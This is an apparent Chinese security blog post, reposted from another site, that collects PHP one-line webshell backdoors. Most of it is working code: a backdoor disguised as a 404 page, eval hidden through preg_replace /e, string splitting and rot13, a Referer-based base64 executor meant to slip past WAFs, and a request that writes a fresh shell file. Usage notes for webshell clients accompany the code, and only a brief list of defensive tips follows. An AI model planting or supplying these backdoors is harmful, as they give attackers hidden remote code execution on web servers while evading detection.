<!DOCTYPE html>
<html><head><base href="https://www.virzz.com"/><meta charset="utf-8"/><meta content="chrome=1" http-equiv="X-UA-Compatible"/><title> 那些强悍的PHP一句话后门 | Virink's Blog</title><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/><meta content="Virink" name="author"/><meta content="那些强悍的PHP一句话后门
我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
强悍的PHP一句话后门
这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。
利用404页面隐藏PHP小马：
Not Found
The requeste" name="description"/><meta content="article" property="og:type"/><meta content="那些强悍的PHP一句话后门 | Virink's Blog" property="og:title"/><meta content="https://www.virzz.com/2016/10/19/那些强悍的PHP一句话后门.html" property="og:url"/><meta content="Virink's Blog" property="og:site_name"/><meta content="那些强悍的PHP一句话后门
我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
强悍的PHP一句话后门
这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。
利用404页面隐藏PHP小马：
Not Found
The requeste" property="og:description"/><meta content="2016-12-12T06:12:18.000Z" property="og:updated_time"/><meta content="summary" name="twitter:card"/><meta content="那些强悍的PHP一句话后门 | Virink's Blog" name="twitter:title"/><meta content="那些强悍的PHP一句话后门
我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
强悍的PHP一句话后门
这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。
利用404页面隐藏PHP小马：
Not Found
The requeste" name="twitter:description"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/favicon.ico" rel="icon" type="image/x-icon"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/favicon.ico" rel="icon"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/font-awesome.min.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/uno.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/tagscloud.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/links.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/archive.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/jquery.fancybox.css" rel="stylesheet"/><link href="./ 那些强悍的PHP一句话后门  Virink's Blog/monokai-sublime.min.css" rel="stylesheet"/><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/highlight.min.js"></script></head><body><span class="mobile btn-mobile-menu"><i aria-hidden="true" class="fa btn-mobile-menu__icon fa-bars"></i></span><header class="panel-cover panel-cover--collapsed"><div class="panel-main"><div class="panel-main__inner panel-inverted"><div class="panel-main__content"> <a href="/" title="link to homepage for Virink's Blog"><img alt="Virink's Blog logo" class="panel-cover__logo logo" src="./ 那些强悍的PHP一句话后门  Virink's Blog/avatar.png" width="80"/></a><h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Virink</a></h1><hr class="panel-cover__divider"/><p class="panel-cover__description"> 探索技術，追求超越。</p><hr class="panel-cover__divider"/><div id="tagscloud"> <a class="tagc1" href="/tags/ctf/">ctf : 13</a><a class="tagc2" href="/tags/php/">php : 11</a><a class="tagc3" href="/tags/writeups/">writeups : 11</a><a class="tagc4" href="/tags/web/">web : 6</a><a class="tagc5" href="/tags/mac/">mac : 4</a><a class="tagc1" href="/tags/thinking/">thinking : 3</a><a class="tagc2" href="/tags/audit/">audit : 3</a><a class="tagc3" href="/tags/linux/">linux : 2</a><a class="tagc4" href="/tags/python/">python : 2</a><a class="tagc5" href="/tags/flask/">flask : 2</a><a class="tagc1" href="/tags/shell/">shell : 2</a><a class="tagc2" href="/tags/ssh/">ssh : 2</a><a class="tagc3" href="/tags/osx/">osx : 1</a><a class="tagc4" href="/tags/mongodb/">mongodb : 1</a><a class="tagc5" href="/tags/debug/">debug : 1</a><a class="tagc1" href="/tags/app/">app : 1</a><a class="tagc2" href="/tags/leanote/">leanote : 1</a><a class="tagc3" href="/tags/go/">go : 1</a><a class="tagc4" href="/tags/mysql/">mysql : 1</a><a class="tagc5" href="/tags/mariadb/">mariadb : 1</a></div><div class="navigation-wrapper"><nav class="cover-navigation cover-navigation--primary"><ul class="navigation"><li class="navigation__item"><a class="blog-button" href="/#blog" title="">博客</a></li><li class="navigation__item"><a class="" href="/archive/" title="">歸檔</a></li><li class="navigation__item"><a class="" href="/links/" title="">友鏈</a></li><li class="navigation__item"><a class="" href="/about/" title="">關於</a></li><li class="navigation__item"><a class="" href="/feed.xml" title="">訂閱</a></li></ul></nav><hr class="panel-cover__divider"/><nav class="cover-navigation navigation--social"><ul class="navigation"><li class="navigation__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="navigation__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="navigation__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></ul></nav></div></div></div><div class="panel-cover--overlay"></div></div></header><div class="content-wrapper"><div class="content-wrapper__inner entry"><article class="post-container post-container--single"><header class="post-header"><h1 class="post-title">那些强悍的PHP一句话后门</h1><div class="post-meta"> <time class="post-meta__date date" datetime="2016-10-19 12:28:37">2016-10-19 12:28:37</time> <span class="post-meta__tags tags">• 標籤: <font class="tags"><a class="tags-link" href="/tags/php/">php</a>, <a class="tags-link" href="/tags/webshell/">webshell</a></font></span></div></header><section class="article-content post" id="post-content"><h1>那些强悍的PHP一句话后门</h1><p>我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。<br/> 强悍的PHP一句话后门<br/> 这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。</p><h2>利用404页面隐藏PHP小马：</h2><p>Not Found<br/> The requested URL was not found on this server.</p><pre><code>&lt;?php 
@preg_replace(“/[pageerror]/e”,$_POST[‘error’],”saft”);
header(‘HTTP/1.1 404 Not Found’);
?&gt;
</code></pre><p>404页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。</p><h2>无特征隐藏PHP一句话：</h2><pre><code>&lt;?php
session_start();
$_POST[‘code’] &amp;&amp; $_SESSION[‘theCode’] = trim($_POST[‘code’]);
$_SESSION[‘theCode’]&amp;&amp;preg_replace(‘\’a\’eis’,’e’.’v’.’a’.’l’.'(base64_decode($_SESSION[\’theCode\’]))’,’a’);
?&gt;
</code></pre><p>将$_POST[‘code’]的内容赋值给$_SESSION[‘theCode’]，然后执行$_SESSION[‘theCode’]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</p><h2>超级隐蔽的PHP后门：</h2><pre><code>&lt;?php $_GET[a]($_GET[b]);?&gt;
</code></pre><p>仅用GET函数就构成了木马；<br/> 利用方法：</p><pre><code>?a=assert&amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
</code></pre><p>执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</p><h2>层级请求，编码运行PHP后门：</h2><p>此方法用两个文件实现，文件1</p><p><strong>1.php</strong></p><pre><code>&lt;?php
header(‘Content-type:text/html;charset=utf-8’);
parse_str($_SERVER[‘HTTP_REFERER’], $a);
if(reset($a) == ’10’ &amp;&amp; count($a) == 9) {
eval(base64_decode(str_replace(” “, “+”, implode(array_slice($a, 6)))));
}
?&gt;
</code></pre><p><strong>2.php</strong></p><pre><code>&lt;?php 
header(‘Content- type:text/html;charset=utf-8’);
//要执行的代码
$code = &lt;&lt; $url, CURLOPT_HEADER =&gt; FALSE, CURLOPT_RETURNTRANSFER =&gt; TRUE, CURLOPT_REFERER =&gt; $referer);
curl_setopt_array($ch, $options);
echo curl_exec($ch);
?&gt;
</code></pre><p>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。</p><h2>PHP后门生成工具weevely</h2><p>weevely 是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏 后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通 过weevely直接运行。<br/> weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所 使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检 查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。</p><h2>三个变形的一句话PHP木马</h2><h3>第一个</h3><pre><code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;
</code></pre><p>在菜刀里写<code>http://site/1.php?2=assert</code>密码是1</p><h3>第二个</h3><pre><code>&lt;?php
$_="";
$_[+""]="";
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?&gt;
&lt;?php
${'_'.$_}['_'](${'_'.$_}['__']);
?&gt;
</code></pre><p>在菜刀里写<code>http://site/2.php?_=assert&amp;__=eval($_POST['pass'])</code> 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</p><h3>第三个</h3><pre><code>&lt;?php
($b4dboy = $_POST['b4dboy']) &amp;&amp; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');
?&gt;
</code></pre><p>str_rot13('riny')即编码后的eval，完全避开了关键字，又不失效果，让人吐血！</p><h2>最后列几个高级的PHP一句话木马后门：</h2><h3>1、</h3><pre><code>$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$hh("/[discuz]/e",$_POST['h'],"Access");
</code></pre><p>//菜刀一句话</p><h3>2、</h3><pre><code>$filename=$_GET['xbid'];
include ($filename);
</code></pre><p>//危险的include函数，直接编译任何文件为php格式运行</p><h3>3、</h3><pre><code>$reg="c"."o"."p"."y";
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
</code></pre><p>//重命名任何文件</p><h3>4、</h3><pre><code>$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$gzid("/[discuz]/e",$_POST['h'],"Access");
</code></pre><p>//菜刀一句话</p><h3>5、include ($uid);</h3><p>//危险的include函数，直接编译任何文件为php格式运行，POST <a href="http://www.xxx.com/index.php?uid=/home/www/bbs/image.gif" rel="external" target="_blank">www.xxx.com/index.php?uid=/home/www/bbs/image.gif</a><br/> //gif插一句话</p><h3>6、典型一句话</h3><p>程序后门代码</p><pre><code>&lt;?php eval_r($_POST[sb])?&gt;
</code></pre><p>程序代码</p><pre><code>&lt;?php @eval_r($_POST[sb])?&gt;
</code></pre><p>//容错代码<br/> 程序代码</p><pre><code>&lt;?php assert($_POST[sb]);?&gt;
</code></pre><p>//使用lanker一句话客户端的专家模式执行相关的php语句<br/> 程序代码</p><pre><code>&lt;?$_POST['sa']($_POST['sb']);?&gt;
</code></pre><p>程序代码</p><pre><code>&lt;?$_POST['sa']($_POST['sb'],$_POST['sc'])?&gt;
</code></pre><p>程序代码</p><pre><code>&lt;?php
@preg_replace("/[email]/e",$_POST['h'],"error");
?&gt;
</code></pre><p>//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入<br/> 程序代码</p><pre><code>h=@eval_r($_POST1);
</code></pre><p>程序代码<br/> //绕过&lt;?限制的一句话</p><h2>总结</h2><p>综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结!<br/> 如何应对PHP一句话后门：<br/> 我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：</p><ol><li>对PHP程序编写要有安全意识</li><li>服务器日志文件要经常看，经常备份</li><li>对每个站点进行严格的权限分配</li><li>对动态文件及目录经常批量安全审查</li><li>学会如何进行手工杀毒《即行为判断查杀》</li><li>时刻关注，或渗入活跃的网络安全营地</li><li>对服务器环境层级化处理，哪怕一个函数也可做规则</li></ol><p>来源： <a href="http://vpszn.net/vpssafe/102152502531.html" rel="external" target="_blank">http://vpszn.net/vpssafe/102152502531.html</a></p></section><div class="copyright"> <span>文本標題:</span><a href="/2016/10/19/那些强悍的PHP一句话后门.html" target="_blank">那些强悍的PHP一句话后门</a><br/> <span>文章作者:</span><a href="/" target="_blank" title="回到主頁">Virink</a><br/> <span>發佈時間:</span>2016-10-19 12:28:37<br/> <span>最後更新:</span>2016-12-12 14:12:18<br/> <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/10/19/那些强悍的PHP一句话后门.html" target="_blank" title="那些强悍的PHP一句话后门">https://www.virzz.com/2016/10/19/那些强悍的PHP一句话后门.html</a><br/> <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。</div></article><footer class="footer"><center> <span class="footer__copyright">© 2016-2017. | ❤ <a href="mailto:virink@outlook.com">Virink</a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span> <span>本站採用<i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div></div><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/jquery.min.js"></script><script>!window.jQuery&&document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/main.js"></script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/scale.fix.js"></script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/tagcloud.js"></script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/jquery.fancybox.js"></script><script type="text/javascript">$(document).ready(function(){$(".fancybox").fancybox({padding:0,helpers:{overlay:{locked:!1}}})})</script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script><script type="text/javascript">$(document).ready(function(){MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/highlight.min.js"></script><script src="./ 那些强悍的PHP一句话后门  Virink's Blog/gallery.js"></script><script>$(document).ready(function(){hljs.initHighlightingOnLoad()})</script><div id="totop" style="position:fixed;bottom:50px;right:30px;cursor:pointer;opacity:1"> <a title="back to top"><img src="./ 那些强悍的PHP一句话后门  Virink's Blog/totop.png" style="width:30px;height:30px"/></a></div><script>!function(o){var t=o("#totop");t.hide(),o(window).scroll(function(){o(document).scrollTop()>100?o(t).stop().fadeTo(300,1):o(t).stop().fadeTo(300,0)}),o(t).click(function(){return o("html, body").animate({scrollTop:0},500),!1})}(jQuery)</script><script>!function(e,t,a,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=t.createElement(a),s=t.getElementsByTagName(a)[0],o.async=1,o.src="https://www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-83885261-1","auto"),ga("send","pageview")</script> <!--[if IE 6]><script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script><![endif]--></body></html>